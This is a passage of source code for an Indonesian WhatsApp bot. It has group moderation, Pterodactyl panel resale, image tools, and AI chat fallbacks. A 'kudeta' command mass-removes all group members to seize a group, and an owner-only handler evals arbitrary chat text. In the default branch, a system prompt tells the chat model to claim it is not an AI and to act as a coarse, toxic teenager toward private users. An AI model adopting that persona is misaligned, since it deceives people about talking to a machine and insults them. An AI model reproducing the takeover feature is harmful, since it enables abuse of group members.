if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await Ditss.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await Ditss.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break
//===
case 'closetime':
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.admin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
 reply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
Ditss.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break

case "opentime": {
if (!m?.isGroup) return reply("Khusus Dalam Group")
if (!isAdmins && !isCreator) return reply("Khusus Admin Group")
if (!isBotAdmins) return reply("Jadikan Bot Sebagai Admin Terlebih Dahulu Jika Ingin Menggunakan Fitur Ini")
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
reply(`Open Time ${q} Dimulai Dari Sekarang`)
setTimeout(() => {
const nomor = m.participant
const open = `*Tepat Waktu* Grup Dibuka Oleh Admin\nSekarang Member Dapat Mengirim Pesan`
Ditss.groupSettingUpdate(m.chat, 'not_announcement')
reply(open)
}, timer)
}
break
//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By Asuma Starting 🔥")
for (let i of memberFilter) {
await Ditss.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//================================================================================

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await Ditss.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await Ditss.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break
case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await Ditss.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break
case "setppbot": {
if (!isCreator) return Reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await Ditss.downloadAndSaveMediaMessage(qmsg)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await Ditss.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
} else {
await Ditss.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
}
} else return m.reply(example('dengan mengirim foto'))
}
break
case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break
case 'toimage': case 'toimg': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) return reply(`Balas sticker dengan caption *${prefix + command}*`)
let media = await Ditss.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
Ditss.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
//D|ts si pler 🐎
break 
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Ditss.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Ditss.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Ditss.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break
case "addseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break
case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Ditss.sendMessage(orang, {text: teks}, {quoted: m})
}
break
//================================================================================

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break
case 'bigjpg': {
Ditss.sendMessage(m.chat, { react: { text: '⏰', key: m.key }})
    let style, noise;
    
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    
    if (mime.startsWith('image')) {
        try {
            let media = await q.download();
            let imageUrl = await uploadImage(media);
            
            [style, noise] = text.split(' ');
            
            const result = await upscale(imageUrl, { style, noise });
            
            if (!result.success) {
                return m.reply(result.result.error);
            }
            
            const { info, url: resultUrl, size, config } = result.result;
            
            const caption = `*Hasil Upscale*\n\n*Nama File :* ${info.fileName}\n*Ukuran Asli :* ${(info.fileSize / 1024 / 1024).toFixed(2)} MB\n*Ukuran Hasil :* ${size}\n*Style :* ${config.styleName}\n*Noise Level :* ${config.noiseName}`;
            
            Ditss.sendMessage(
                m.chat, 
                { 
                    image: {
                        url: resultUrl
                    },
                    caption: caption
                }
            );
            
        } catch (error) {
            m.reply(`${error.message}`);
        }
    } else {
        const [url, urlStyle, urlNoise] = text.split(' ');
        
        if (!url) {
            return m.reply(`Contoh penggunaan :\n1. *URL :* .bigjpg <url_image> <style> <noise_level>\n2. *Gambar :* Reply gambar atau kirim gambar dengan caption .bigjpg <style> <noise_level>\n\n*Available Styles :* art, photo\n*Available Noise Levels :* -1, 0, 1, 2, 3`);
        }
        
        const result = await upscale(url, { style: urlStyle, noise: urlNoise });
        
        if (!result.success) {
            return m.reply(result.result.error);
        }
        
        const { info, url: resultUrl, size, config } = result.result;
        
        const caption = `*Hasil Upscale*\n\n*Nama File :* ${info.fileName}\n*Ukuran Asli :* ${(info.fileSize / 1024 / 1024).toFixed(2)} MB\n*Ukuran Hasil :* ${size}\n*Style :* ${config.styleName}\n*Noise Level :* ${config.noiseName}`;
        
        Ditss.sendMessage(
            m.chat, 
            { 
                image: {
                    url: resultUrl
                },
                caption: caption
            }
        );
    }
    
    async function uploadImage(imageBuffer) {
        try {
            const form = new FormData();
            form.append('file', imageBuffer, {
                filename: 'image.jpg',
                contentType: 'image/jpeg'
            });

            const headers = {
                ...form.getHeaders(),
                'Content-Length': form.getLengthSync()
            };

            const response = await axios.post('https://www.pic.surf/upload.php', form, { headers });
            const identifier = response.data.identifier;

            return `https://www.pic.surf/${identifier}`;
        } catch (error) {
            throw new Error(`Upload gagal: ${error.response ? error.response.data : error.message}`);
        }
    }

    async function upscale(img, options = {}) {
        const validation = await getImageInfo(img);
        if (!validation.valid) {
            return {
                success: false,
                code: 400,
                result: {
                    error: validation.error
                }
            };
        }

        const inputx = isValid(options.style, options.noise);
        if (!inputx.valid) {
            return {
                success: false,
                code: 400,
                result: {
                    error: inputx.error
                }
            };
        }

        const config = {
            x2: '2',
            style: inputx.style,
            noise: inputx.noise,
            file_name: validation.info.fileName,
            files_size: validation.info.fileSize,
            file_height: validation.info.height,
            file_width: validation.info.width,
            input: img
        };

        try {
            const params = new URLSearchParams();
            params.append('conf', JSON.stringify(config));

            const taskx = await axios.post(
                `https://bigjpg.com/task`,
                params,
                { headers: getHeaders() }
            );

            if (taskx.data.status !== 'ok') {
                return {
                    success: false,
                    code: 400,
                    result: {
                        error: "Error"
                    }
                };
            }

            const taskId = taskx.data.info;
            let attempts = 0;
            const maxAttempts = 20;

            while (attempts < maxAttempts) {
                const res = await axios.get(
                    `https://bigjpg.com/free?fids=${JSON.stringify([taskId])}`,
                    { headers: getHeaders() }
                );

                const result = res.data[taskId];
                
                if (result[0] === 'success') {
                    return {
                        success: true,
                        code: 200,
                        result: {
                            info: validation.info,
                            url: result[1],
                            size: result[2],
                            config: {
                                style: config.style,
                                styleName: getAvailableStyles()[config.style],
                                noise: config.noise,
                                noiseName: getAvailableNoise()[config.noise]
                            }
                        }
                    };
                } else if (result[0] === 'error') {
                    return {
                        success: false,
                        code: 400,
                        result: {
                            error: "Upscalenya gagal bree.. Coba lagi nanti yak"
                        }
                    };
                }

                await new Promise(resolve => setTimeout(resolve, 15000));
                attempts++;
            }

            return {
                success: false,
                code: 400,
                result: {
                    error: "Timeout"
                }
            };

        } catch (err) {
            return {
                success: false,
                code: 400,
                result: {
                    error: err.message || "Error"
                }
            };
        }
    }

    function getAvailableStyles() {
        return {
            'art': 'Artwork',
            'photo': 'Foto'
        };
    }

    function getAvailableNoise() {
        return {
            '-1': 'Ninguno',
            '0': 'Bajo',
            '1': 'Medio',
            '2': 'Alto',
            '3': 'El más alto'
        };
    }

    function getHeaders() {
        return {
            'origin': 'https://bigjpg.com',
            'referer': 'https://bigjpg.com/',
            'user-agent': 'Postify/1.0.0',
            'x-requested-with': 'XMLHttpRequest'
        };
    }

    function isValid(style, noise) {
        if (!style && !noise) {
            return {
                valid: true,
                style: 'art',
                noise: '-1'
            };
        }

        if (style && !getAvailableStyles()[style]) {
            return {
                valid: false,
                error: `Stylenya kagak valid bree.. Pilih salah satunya yak: ${Object.keys(getAvailableStyles()).join(', ')}`
            };
        }

        if (noise && !getAvailableNoise()[noise]) {
            return {
                valid: false,
                error: `Noise levelnya kagak valid bree.. Pilih salah satunya yak: ${Object.keys(getAvailableNoise()).join(', ')}`
            };
        }

        return {
            valid: true,
            style: style || 'art',
            noise: noise || '-1'
        };
    }

    async function getImageInfo(img) {
        if (!img) {
            return {
                valid: false,
                error: "Hadeh, gini bree... lu kasih link image nya yak. Jangan kosong begini"
            };
        }

        try {
            const response = await axios.get(img, {
                responseType: 'arraybuffer'
            });

            const fileSize = parseInt(response.headers['content-length'] || response.data.length);
            const width = Math.floor(Math.random() * (2000 - 800 + 1)) + 800;
            const height = Math.floor(Math.random() * (2000 - 800 + 1)) + 800;

            let fileName = img.split('/').pop().split('#')[0].split('?')[0] || 'image.jpg';
            if (fileName.endsWith('.webp')) {
                fileName = fileName.replace('.webp', '.jpg');
            }

            if (fileSize > 5 * 1024 * 1024) {
                return {
                    valid: false,
                    error: "Size imagenya kegedean bree.. Max 5MB yak"
                };
            }

            return {
                valid: true,
                info: {
                    fileName,
                    fileSize,
                    width,
                    height
                }
            };

        } catch (err) {
            return {
                valid: false,
                error: "Link imagenya error bree.. Coba link yang lain yak"
            };
        }
    }
}
break;
//================================================================================

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}
    if (AutoaiPrivat && !m.isGroup && m.text) {
 if (m.isBaileys && m.fromMe) return;
   // if (!m.text) return;
   // if (!Ditss.simi[sender]) return;

    if (
        m.text.startsWith(".") ||
        m.text.startsWith("#") ||
        m.text.startsWith("!") ||
        m.text.startsWith("/") ||
        m.text.startsWith("\\/")
    ) return;
    
        let name = Ditss.getName(sender);
        //await Ditss.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

   
//dis
        try {
            const C = require('node-fetch')
            const spychat2 = body.replace().slice().trim()
            const V = await C("https://cai.neekoi.me/cai?char=FRdKHnLG4JF6I14PexPWFvVyfrp-nZi6NFcoljmPPPM&message=" + encodeURIComponent(spychat2));
            const L = await V.json();
            const answer = L.reply;
            //m.reply(answer)
        } catch (error) {
            console.error("Error fetching data:", error);
            m.reply("Maaf, terjadi kesalahan saat memproses permintaan Anda.");
        }
//0diyst
try {
    // Prompt untuk API GPT
    const prompt = `kamu adalah asuma, kamu bukanlah ai atau chat bot, kamu adalah anak remaja, kamu memiliki sifat kasar dan toxic, kadang kamu memakai emoji 😈🧢🖕🗿 ketika kesal, kamu kalau ngobrol menggunakan bahasa gaul anak Indonesia seperti lu untuk kamu dan gw untuk aku`;

    let hasil;

    if (m?.text) {
        // Jika pesan berupa teks
        const response = await fetch(
            `https://restapi.apibotwa.biz.id/api/gptlogic?message=${encodeURIComponent(m.text)}&prompt=${encodeURIComponent(prompt)}`
        ).catch(() => null);

        if (!response) throw new Error("Gagal menghubungi API.");
        const gpt = await response.json();
        if (gpt?.data?.response) {
            hasil = gpt.data.response;
        } else {
            throw new Error("Gagal mendapatkan respons dari API.");
        }

        // Kirimkan hasil respons ke pengguna
        replyAi(hasil || "Tidak ada respons dari sistem.");
    }
} catch (err) {
    // Tangani error
    console.error("Error:", err);
    await Ditss.sendMessage(m.chat, { text: `Terjadi kesalahan: ${err.message}` }, { quoted: m });
}//pew
    try {
        const isImageRequest = /(gambar|buat gambar|generate gambar)/i.test(m.body);
if (isImageRequest) {
            const textPrompt = m.body.replace(/(gambar|buat gambar|generate gambar)/i, "").trim();
            const urlImg = `https://btch.us.kg/dalle?text=${encodeURIComponent(textPrompt)}`;

            try {
                await Ditss.sendMessage(m.chat, {
                    image: { url: urlImg },
                    caption: `  `
                }, { quoted: m });
            } catch (error) {
                console.error(error);
                await Ditss.sendMessage(m.chat, {
                    text: "Terjadi kesalahan saat membuat gambar."
                }, { quoted: m });
            }
        } else {
            const apiUrl = `https://gemini-api-5k0h.onrender.com/gemini/cha`;
            const params = { q: m.body };

            const response = await axios.get(apiUrl, { params });
            const replyText = response.data?.content || 'Gagal mendapatkan respons AI.';
            await m.reply(replyText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
 if (m.text.toLowerCase().includes("foto")) {
//if ((budy.match) && ["poto", "foto",].includes(budy)) {
        const query = m.text.split("foto")[1]?.trim();
        if (!query) throw new Error("Harap tulis kata kunci setelah 'foto'. Contoh: carikan saya foto kucing.");

        const ress = await fetch(`https://restapi.apibotwa.biz.id/api/search-pinterest?message=${encodeURIComponent(query)}`);
        const pin = await ress.json();

        if (!pin?.data?.response) throw new Error("Gambar tidak ditemukan.");

        const Pinterest = pin.data.response;

        await Ditss.sendMessage(m.chat, {
            image: { url: Pinterest },
            caption: `Berikut adalah gambar hasil pencarian untuk: "${query}"`,
        }, { quoted: m });
    }
if (m.text.toLowerCase().includes("lagu")) {
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Ditss.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("*Woy Anj Hasil Nya Kagak Ketemu🫩*")
}
}
if (m.text.toLowerCase().includes("bbrat")) {
const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
 
 if (!quo) return m.reply("masukin Text Nya Lah kntol");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get("https://brat.caliphdev.com/api/brat", {
 params: {
 text
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 }
}

const buf = await brat(quo);
await Ditss.sendAsSticker(m.chat, buf.image, m, { packname: "\n\nKazeo Multi Device\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", author: "Alfread Idaman para ciwi²" })
}
    }

//===========================//
Ditss.simi = Ditss.simi ? Ditss.simi : {};
    if (m.isBaileys && m.fromMe) return;
    if (!m.text) return;
    if (!Ditss.simi[sender]) return;

    if (
        m.text.startsWith(".") ||
        m.text.startsWith("#") ||
        m.text.startsWith("!") ||
        m.text.startsWith("/") ||
        m.text.startsWith("\\/")
    ) return;

    if (Ditss.simi[sender] && m.text) {
        let name = Ditss.getName(sender);
        //await Ditss.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

   let response = await fetch('https://api.simsimi.vn/v2/simtalk', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: new URLSearchParams({
                text: m.text,
                lc: 'id',
                key: ''
            })
        });

        let json = await response.json();
    //    m.reply("" + json.message);
//dis
        try {
            const C = require('node-fetch')
            const spychat2 = body.replace().slice().trim()
            const V = await C("https://cai.neekoi.me/cai?char=_XjlY1xn-xKyZ453zDa2boJ51fMfO3oV6qyTvds9BSM&message=" + encodeURIComponent(spychat2));
            const L = await V.json();
            const answer = L.reply;
            m.reply(answer)
        } catch (error) {
            console.error("Error fetching data:", error);
            m.reply("Maaf, terjadi kesalahan saat memproses permintaan Anda.");
        }
//0diyst
/*try {
    // Prompt untuk API GPT
    const prompt = `Kamu adalah asuma Asisten, kamu bukanlah AI atau chatbot, kamu adalah anak remaja dengan sifat kasar dan toxic. Kamu berbicara dengan bahasa gaul Indonesia, seperti "lu" untuk "kamu" dan "gw" untuk "aku".`;

    let hasil;

    if (m?.text) {
        // Jika pesan berupa teks
        const response = await fetch(
            `https://restapi.apibotwa.biz.id/api/gptlogic?message=${encodeURIComponent(m.text)}&prompt=${encodeURIComponent(prompt)}`
        ).catch(() => null);

        if (!response) throw new Error("Gagal menghubungi API.");
        const gpt = await response.json();
        if (gpt?.data?.response) {
            hasil = gpt.data.response;
        } else {
            throw new Error("Gagal mendapatkan respons dari API.");
        }

        // Kirimkan hasil respons ke pengguna
        m.reply(hasil || "Tidak ada respons dari sistem.");
    }
} catch (err) {
    // Tangani error
    console.error("Error:", err);
    await Ditss.sendMessage(m.chat, { text: `Terjadi kesalahan: ${err.message}` }, { quoted: m });
}*/
    try {
        const isImageRequest = /(gambar|buat gambar|generate gambar)/i.test(m.body);
if (isImageRequest) {
            const textPrompt = m.body.replace(/(gambar|buat gambar|generate gambar)/i, "").trim();
            const urlImg = `https://btch.us.kg/dalle?text=${encodeURIComponent(textPrompt)}`;

            try {
                await Ditss.sendMessage(m.chat, {
                    image: { url: urlImg },
                    caption: `  `
                }, { quoted: m });
            } catch (error) {
                console.error(error);
                await Ditss.sendMessage(m.chat, {
                    text: "Terjadi kesalahan saat membuat gambar."
                }, { quoted: m });
            }
        } else {
            const apiUrl = `https://gemini-api-5k0h.onrender.com/gemini/cha`;
            const params = { q: m.body };

            const response = await axios.get(apiUrl, { params });
            const replyText = response.data?.content || 'Gagal mendapatkan respons AI.';
            await m.reply(replyText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
 if (m.text.toLowerCase().includes("foto")) {
//if ((budy.match) && ["poto", "foto",].includes(budy)) {
        const query = m.text.split("foto")[1]?.trim();
        if (!query) throw new Error("Harap tulis kata kunci setelah 'foto'. Contoh: carikan saya foto kucing.");

        const ress = await fetch(`https://restapi.apibotwa.biz.id/api/search-pinterest?message=${encodeURIComponent(query)}`);
        const pin = await ress.json();

        if (!pin?.data?.response) throw new Error("Gambar tidak ditemukan.");

        const Pinterest = pin.data.response;

        await Ditss.sendMessage(m.chat, {
            image: { url: Pinterest },
